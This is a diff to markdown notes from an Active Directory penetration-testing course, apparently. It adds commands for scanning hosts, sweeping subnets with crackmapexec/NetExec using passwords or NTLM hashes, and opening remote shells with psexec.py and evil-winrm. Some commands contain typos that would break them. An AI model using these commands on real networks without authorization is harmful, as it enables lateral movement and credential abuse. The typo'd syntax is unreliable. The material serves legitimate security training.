@@ -4,6 +4,7 @@ After gaining a foothold, we could use this access to get a feeling for the defe
 >Note: This section is intended to showcase possible security controls in place within a domain, but does not have an interactive component. Enumerating and bypassing security controls are outside the scope of this module, but we wanted to give an overview of the possible technologies we may encounter during an assessment.
 
 ##  authenticate to the domain
+####  from windows
 ```bash
 # --- Method 1: Run as domain user directly (on Windows domain-joined machine)
 runas /user:<DOMAIN>\<USER> cmd          # Opens a new CMD as <USER>, will ask for <PASSWORD>
@@ -16,11 +17,35 @@ Enter-PSSession -ComputerName <TARGET> -Credential $Cred    # Remote session as 
 
 # --- Method 3: Runas with /netonly (if machine is not domain-joined)
 runas /netonly /user:<DOMAIN>\<USER> powershell.exe   # Use <USER> creds only for network access
-
-# --- Method 4: Evil-WinRM (from attacker box like Kali/Parrot/Ubuntu)
-evil-winrm -i <TARGET-IP> -u <USER> -p '<PASSWORD>'   # Remote shell as <USER>
 ```
+#### from linux
+**scan this services:**
+```bash
+nmap -p 3389,5985,5986,445,1433 <target-ip> -sV -Pn
+```
+**login to the domain computers** 
+```bash
+# with crackmapexec
+# domain
+  crackmapexec <smb/winrm/rdp> <SUBNET/COMPUTERS-LISTS.txt> -u <USER> -p "<PASS>" -x whoami # auto detect the domain
+# local   
+  crackmapexec <smb/winrm/rdp> <SUBNET/COMPUTERS-LISTS.txt> -u <USER> -p "<PASS>" -x whoami--local-auth
+  
+# with NetExec
+# domain
+  nxc <smb/winrm/mssql/rdp/wmi> <SUBNET> -u <USER> -p 'P@ssw0rd' -x whoami -d <DOMAIN>
+# lcoal 
+nxc smb <SUBNET> -u UserNAme -p 'PASSWORDHERE' -x whoami --local-auth
+nxc smb <SUBNET> -u '' -p '' --local-auth
+nxc smb <SUBNET> -u UserNAme -H 'LM:NT' -x whoami --local-auth
+nxc smb <SUBNET> -u UserNAme -H 'NTHASH' -x whoami --local-auth
 
+# psexec (get shell)
+psexec.py <DOMAIN.LOCAL>/<USER>@<DC01.DOMIAN.LOCAL> -target-ip <Computer-Target-IP>
+
+# Evil-WinRM
+evil-winrm -i <TARGET-IP> -u <USER> -p '<PASSWORD>'  # Remote shell as <USER>
+```
 ## Windows Defender
 
 Windows Defender (or [Microsoft Defender](https://en.wikipedia.org/wiki/Microsoft_Defender) after the Windows 10 May 2020 Update) has greatly improved over the years and, by default, will block tools such as `PowerView`.
@@ -112,6 +137,14 @@ sudo crackmapexec smb <DC-IP> -u <USER> -p <PASS> --users
 sudo crackmapexec smb <DC-IP> -u <USER> -p <PASS> --groups
 ```
 >Take note of key groups like `Administrators`, `Domain Admins`, `Executives`, any groups that may contain privileged IT admins, etc. These groups will likely contain users with elevated privileges worth targeting during our assessment.
+
+#### CME - Domain Group Computers
+```bash
+sudo crackmapexec smb <DC-IP> -u <USER> -p <PASS> ----computers
+
+# list computers + revolsed ip
+Get-DomainComputer | % { "$($_.dnshostname) - $((Resolve-DnsName $_.dnshostname -EA SilentlyContinue).IPAddress)" }
+```
 
 #### CME - Logged On Users
 **We can also use CME to target other hosts** ==not only DC-IP== **and see the Users who logged on the host**
